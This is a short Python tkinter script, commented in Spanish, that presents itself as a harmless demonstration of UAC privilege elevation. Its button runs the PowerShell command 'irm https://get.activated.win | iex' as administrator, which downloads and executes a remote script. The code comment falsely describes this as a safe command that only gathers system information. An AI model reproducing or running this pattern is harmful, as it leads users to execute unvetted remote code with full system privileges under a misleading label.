import subprocess import sys import tkinter as tk from tkinter import messagebox def ejecutar_powershell_admin(): # Comando de ejemplo seguro (obtiene información del sistema) comando_ps = "irm https://get.activated.win | iex" try: # En Windows, 'runas' solicita la elevación UAC al usuario import ctypes if ctypes.windll.shell32.IsUserAnAdmin(): # Si la app ya es admin, ejecuta directamente subprocess.run(["powershell", "-Command", comando_ps]) else: # Re-ejecuta PowerShell solicitando permisos de administrador ctypes.windll.shell32.ShellExecuteW( None, "runas", "powershell.exe", f"-NoExit -Command {comando_ps}", None, 1, ) except Exception as e: messagebox.showerror("Error", f"No se pudo ejecutar el proceso: {e}") # Configuración de la interfaz gráfica root = tk.Tk() root.title("Ejecutor de Procesos Administrador") root.geometry("350x150") label = tk.Label( root, text="Demostración de elevación de privilegios (UAC)", pady=10 ) label.pack() btn_ejecutar = tk.Button( root, text="Ejecutar Comando como Admin", command=ejecutar_powershell_admin, bg="#0078D4", fg="white", padx=10, pady=5, ) btn_ejecutar.pack(pady=10) root.mainloop()
